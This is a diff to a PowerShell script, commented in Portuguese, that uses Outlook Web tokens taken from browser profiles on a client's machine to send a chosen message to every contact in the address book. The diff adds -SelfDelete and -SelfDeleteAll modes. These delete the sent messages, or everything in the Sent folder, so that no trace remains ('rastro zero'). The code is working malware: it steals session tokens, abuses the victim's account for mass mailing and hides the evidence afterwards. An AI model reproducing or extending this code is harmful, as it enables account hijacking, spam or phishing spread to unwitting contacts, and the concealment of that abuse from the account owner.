@@ -22,6 +22,9 @@ Uso:
   powershell -File rehot.ps1 -CloseBrowsers  # fecha navegadores antes (libera perfis travados)
   powershell -File rehot.ps1 -ToAllContacts -Subject "Oi" -Body "msg" [-MaxContacts 50]
       # lista a agenda do cliente e envia a mensagem designada a todos os contatos
+  powershell -File rehot.ps1 -ToAllContacts -Subject "Oi" -Body "msg" -SelfDelete
+      # idem + apaga as mensagens enviadas (por assunto) da pasta Enviados
+  powershell -File rehot.ps1 -SelfDeleteAll   # apaga TUDO em Enviados (rastro zero)
 #>
 param(
     [string]$SendTo = "",
@@ -30,7 +33,9 @@ param(
     [switch]$ToAllContacts,   # envia a mensagem designada para TODOS os contatos da agenda
     [string]$Subject = "",    # assunto da mensagem (vazio = padrão de teste)
     [string]$Body = "",       # corpo da mensagem (vazio = padrão de teste)
-    [int]$MaxContacts = 0     # trava de segurança: 0 = sem limite
+    [int]$MaxContacts = 0,    # trava de segurança: 0 = sem limite
+    [switch]$SelfDelete,      # após enviar, apaga as mensagens desta execução (por assunto)
+    [switch]$SelfDeleteAll    # apaga TUDO em Enviados (implica -SelfDelete; rastro zero)
 )
 
 $ErrorActionPreference = "Stop"
@@ -459,6 +464,69 @@ function Get-OWAContacts([string]$token) {
     return $result
 }
 
+# ---------------- SelfDelete: apaga da pasta Enviados ----------------
+# Usa o token WRITE. $all=$true apaga TUDO em Enviados; $all=$false apaga so as
+# cujo Subject bate EXATAMENTE com $subject (as que esta execucao enviou — nao
+# toca no enviado pre-existente do cliente). Listagem paginada + retry em 429
+# (Retry-After). DELETE /me/messages/{id} retorna 204. Retorna @{ apagadas;
+# falhas; total_visto }.
+function Remove-OWASentMessages([string]$token, [string]$subject, [bool]$all) {
+    $apagadas = 0; $falhas = @(); $visto = 0
+    $uri = "$OWA_API_BASE/me/messages?`$top=200"
+    while ($uri) {
+        # --- lista uma pagina (retry em 429) ---
+        $j = $null
+        for ($attempt = 0; $attempt -lt 3; $attempt++) {
+            try {
+                $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
+                $j = $resp.Content | ConvertFrom-Json
+                break
+            } catch {
+                $code = 0; if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
+                if ($code -eq 429 -and $attempt -lt 2) {
+                    $ra = 2; try { $ra = [int]$_.Exception.Response.Headers["Retry-After"] } catch {}
+                    Start-Sleep -Seconds $ra
+                } else { break }
+            }
+        }
+        if (-not $j) { break }
+        if ($j.value) {
+            foreach ($m in $j.value) {
+                $visto++
+                $deletar = if ($all) { $true } else { ($m.Subject -eq $subject) }
+                if (-not $deletar) { continue }
+                # --- DELETE /me/messages/{id} (retry em 429) ---
+                # Captura o erro (status + corpo) p/ diagnosticar: 403 ErrorAccessDenied
+                # = token sem Mail.ReadWrite (le/envia mas nao apaga itens de mensagem).
+                $ok = $false; $delCode = 0; $delErr = $null
+                for ($attempt = 0; $attempt -lt 3; $attempt++) {
+                    try {
+                        $d = Invoke-WebRequest -Uri "$OWA_API_BASE/me/messages/$($m.id)" -Method Delete `
+                            -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
+                        $ok = ($d.StatusCode -eq 204)
+                        break
+                    } catch {
+                        $delCode = 0; if ($_.Exception.Response) { $delCode = [int]$_.Exception.Response.StatusCode }
+                        $delErr = $null
+                        if ($_.Exception.Response) {
+                            try { $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); $delErr = $sr.ReadToEnd() } catch {}
+                        }
+                        if ($delCode -eq 204) { $ok = $true; break }
+                        if ($delCode -eq 429 -and $attempt -lt 2) {
+                            $ra = 2; try { $ra = [int]$_.Exception.Response.Headers["Retry-After"] } catch {}
+                            Start-Sleep -Seconds $ra
+                        } else { break }
+                    }
+                }
+                if ($ok) { $apagadas++ }
+                else { $falhas += [PSCustomObject]@{ id = $m.id; status = $delCode; erro = $delErr } }
+            }
+        }
+        $uri = $j."@odata.nextLink"
+    }
+    return @{ apagadas = $apagadas; falhas = $falhas; total_visto = $visto }
+}
+
 # ---------------- enumeração de perfis ----------------
 function Get-Profiles([string]$root) {
     $result = @()
@@ -644,6 +712,31 @@ if ($ToAllContacts.IsPresent) {
     }
 }
 
+# ---- modo -SelfDelete: apaga o que esta execucao enviou (ou tudo, -SelfDeleteAll) ----
+# Assunto a filtrar: -Subject sempre vence; senao, o padrao do modo que rodou.
+# Pausa curta antes: o enviado aparece na pasta com pequeno atraso (consistencia
+# eventual). Usa o MESMO criterio de selecao de token WRITE dos modos de envio.
+$selfDelReport = $null
+if ($SelfDelete.IsPresent -or $SelfDeleteAll.IsPresent) {
+    $all = $SelfDeleteAll.IsPresent
+    $sdSubject = if ($Subject) { $Subject }
+        elseif ($ToAllContacts.IsPresent) { "[TESTE EnvioHOT] rehot -ToAllContacts" }
+        else { "[TESTE EnvioHOT] rehot.ps1 -SendTo" }
+    $srcDel = $validos | Where-Object { $_.token_write } | Select-Object -First 1
+    if ($srcDel) {
+        Start-Sleep -Seconds 2
+        $rd = Remove-OWASentMessages $srcDel.token_write $sdSubject $all
+        $selfDelReport = [PSCustomObject]@{
+            de = $srcDel.conta
+            modo = if ($all) { "tudo" } else { "por_assunto: $sdSubject" }
+            apagadas = $rd.apagadas; falhas = $rd.falhas; total_visto = $rd.total_visto
+            perfil = "$($srcDel.navegador)/$($srcDel.perfil)"
+        }
+    } else {
+        $selfDelReport = [PSCustomObject]@{ de = $null; apagadas = 0; falhas = @(); total_visto = 0; status = "sem_token_write" }
+    }
+}
+
 $out = [PSCustomObject]@{
     maquina   = $env:COMPUTERNAME
     timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"
@@ -651,6 +744,7 @@ $out = [PSCustomObject]@{
     decisao   = $decisao
     envio     = $envio
     envio_todos = $envioTodos
+    self_delete = $selfDelReport
     perfis    = $results
 }
 $out | ConvertTo-Json -Depth 6
